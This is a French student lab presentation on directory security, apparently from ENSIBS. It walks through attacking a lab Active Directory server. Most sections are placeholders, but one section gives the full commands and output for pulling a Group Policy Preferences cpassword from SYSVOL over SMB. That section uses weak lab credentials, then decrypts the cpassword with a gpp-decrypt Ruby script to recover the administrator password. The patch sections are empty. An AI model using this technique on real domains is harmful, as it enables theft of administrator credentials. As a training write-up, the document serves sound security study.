[INCLUDE=presentation]
Title         : Sécurité des annuaires
Sub Title     : Travaux
Author        : Adrien GENNEVOIS - Erwan JAN
Affiliation   : ENSIBS
Reveal Theme  : sky
Beamer Theme  : singapore

[TITLE]

# Sommaire

[TOC]

#Contexte

Lors de ce TP nous avions à disposition 1 serveur LDAP ainsi que 1 ordinateur qui était dans le domaine active directory de ce serveur.  
  
La seule information que nous avions à notre disposition était les adresses IP des deux machines.  
  
Le but était de trouver les plus de failles possible, de les exploiter afin de récupérer le plus d'informations possibles puis de trouver le moyen de les patcher.

~ Begin Vertical
# Faille #1 : Enumeration LDAP

Informations utilisées : bla bla bla
Enum4Linux

## Exploitation de la vulnérabilité 1 
bla bla bla  

## Patch de la vulnérabilité 1
bla bla bla  

~ End Vertical

~ Begin Vertical

# Faille #2 : SMB 

Informations utilisées : bla bla bla

## Exploitation de la vulnérabilité 2
bla bla bla  

## Patch de la vulnérabilité 2
bla bla bla  

~ End Vertical

~ Begin Vertical

# Faille #3 : Extraction de la politique GPO 

Informations utilisées : 

* On connait les identifiants du compte testad (testad/testad)

## Exploitation de la vulnérabilité 3

~ Slide

On accède via le serveur smb au dossier sysvol contenant les GPO. Pour cela on utilise le compte que l'on a trouver précèdement l'utilisateur testad ayant pour mdp testad.


``` javascript
~/Documents/enum4linux-0.8.9$ smbclient //192.168.1.234/SYSVOL -U GALACTIC/testad
WARNING: The "syslog" option is deprecated
Enter GALACTIC/testad's password: 
Domain=[GALACTIC] OS=[Windows Server 2012 R2 Standard Evaluation 9600]  
Server=[Windows Server 2012 R2 Standard Evaluation 6.3]
smb: \> ls
  .                                   D        0  Fri Mar  9 22:03:12 2018
  ..                                  D        0  Fri Mar  9 22:03:12 2018
  GALACTIC.LAN                        D        0  Fri Mar  9 22:03:12 2018

		7774207 blocks of size 4096. 5293702 blocks available
```


~
~ Slide 
Nous allons ensuite évoluer dans l'arborescence afin de trouver le fichier Group.xml qui contient les paramètres des GPO et notamment le mot de passe du compte administrateur.
``` javascript
smb: \GALACTIC.LAN\Policies\{62DB8100-2596-499B-AABF-55FE554CE724}\Machine\Preferences\Groups\> ls
  .                                   D        0  Sat Mar 10 22:07:49 2018
  ..                                  D        0  Sat Mar 10 22:07:49 2018
  Groups.xml                          A      560  Sat Mar 10 22:07:54 2018

		7774207 blocks of size 4096. 5293430 blocks available
```
On affiche ensuite le contenu du fichier Group.xml et on récupère le contenu du champ cpassword.
``` javascript
~/Documents$ cat Groups.xml 
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"> 
<User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="Administrator (built-in)"  
image="2" changed="2018-03-10 21:07:54" uid="{9FC58681-90A0-4F1B-8599-76C968F68305}" 
userContext="0" removePolicy="0"> <Properties action="U" newName="" fullName=""  
description="" cpassword="O1Q+XKztTjZpWBhzHRjjhinmkA0yRMsqPEKLBvMc8ZA" changeLogon="0"  
noChange="1" neverExpires="0" acctDisabled="0" subAuthority="RID_ADMIN"   
userName="Administrator (built-in)"/> </User> </Groups>
```
~
~ Slide
Le cpassword que nous avons récupéré n'est actuellement pas lisible.En effet celui-ci est en chiffrer en AES et il va falloir le décrypter. Pour cela on récupère le script ruby de gpp-decrypt :
``` javascript
require 'rubygems'
require 'openssl'
require 'base64'

encrypted_data = "O1Q+XKztTjZpWBhzHRjjhinmkA0yRMsqPEKLBvMc8ZA"

def decrypt(encrypted_data)
  padding = "=" * (4 - (encrypted_data.length % 4))
  epassword = "#{encrypted_data}#{padding}"
  decoded = Base64.decode64(epassword)

  key = "\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4$
  aes = OpenSSL::Cipher::Cipher.new("AES-256-CBC")
  aes.decrypt
  aes.key = key
  plaintext = aes.update(decoded)
  plaintext << aes.final
  pass = plaintext.unpack('v*').pack('C*') # UNICODE conversion

  return pass
end

blah = decrypt(encrypted_data)
puts blah
```
~
~ Slide
On execute ensuite le script afin d'obtenir le mot de passe du compte administrateur : SuPa_MDP_S1TH.
``` javascript
~/Documents/gpp-decrypt-master$ ruby gpp-decrypt.rb
SuPa_MDP_S1TH
```
~

## Patch de la vulnérabilité 3
bla bla bla  

~ End Vertical

~ Begin Vertical

# Faille #4 : Mimikat extraction credentials 

Informations utilisées : bla bla bla

## Exploitation de la vulnérabilité 4
bla bla bla  

## Patch de la vulnérabilité 4
bla bla bla  

~ End Vertical